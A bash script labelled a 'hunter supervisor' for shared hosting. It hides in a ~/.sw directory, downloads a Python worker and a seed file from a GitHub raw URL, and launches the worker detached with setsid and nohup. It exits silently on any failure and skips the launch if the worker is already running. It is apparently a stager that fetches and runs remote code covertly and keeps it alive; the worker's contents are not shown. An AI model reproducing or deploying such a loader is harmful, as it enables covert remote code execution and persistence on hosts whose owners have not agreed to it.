#!/bin/bash
# row#07 hunter supervisor -- safe on shared hosting: tiny footprint, self-healing
set -u
D="$HOME/.sw"; mkdir -p "$D" || exit 0
BASE="${SW_BASE:-https://raw.githubusercontent.com/heinzo666/sdk-assets/main}"
cd "$D" || exit 0
fetch() { # url outfile
  [ -s "$2" ] || { curl -fsSL -m 25 "$1" -o "$2.tmp" 2>>"$D/fetch.err" && mv "$2.tmp" "$2"; }
}
fetch "$BASE/scan_worker.py" scan_worker.py
fetch "$BASE/watch_seed.json" watch_seed.json
[ -s scan_worker.py ] || exit 0
PY=$(command -v python3 || command -v python3.12 || command -v python3.11 || command -v python3.10 || command -v python3.9)
[ -n "${PY:-}" ] || { echo "no-python $(date)" >> "$D/boot.log"; exit 0; }
pgrep -f "scan_worker.py" >/dev/null 2>&1 && exit 0
( setsid nohup "$PY" "$D/scan_worker.py" >> "$D/log.txt" 2>&1 & )
echo "start $(date) py=$PY" >> "$D/boot.log"
exit 0
